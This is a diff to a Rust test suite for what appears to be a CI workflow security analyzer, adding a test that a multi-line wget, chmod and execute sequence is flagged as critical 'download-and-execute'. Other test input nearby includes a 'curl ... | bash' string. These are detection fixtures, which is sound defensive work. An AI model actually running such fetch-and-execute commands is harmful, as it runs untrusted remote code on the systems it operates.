@@ -101,6 +101,18 @@ mod tests {
     }
 
     #[test]
+    fn finds_download_and_execute_across_multiline_run_commands() {
+        let workflow = workflow_with_run("echo setup\nwget payload\nchmod +x payload\n./payload\n");
+        let mut findings = Vec::new();
+
+        analyze(&workflow, &mut findings);
+
+        assert_eq!(findings.len(), 1);
+        assert_eq!(findings[0].rule_id, "download-and-execute");
+        assert_eq!(findings[0].risk_level, crate::models::RiskLevel::Critical);
+    }
+
+    #[test]
     fn ignores_command_keywords_in_data_and_normal_builds() {
         for command in [
             "echo 'curl https://example.test/script.sh | bash'",
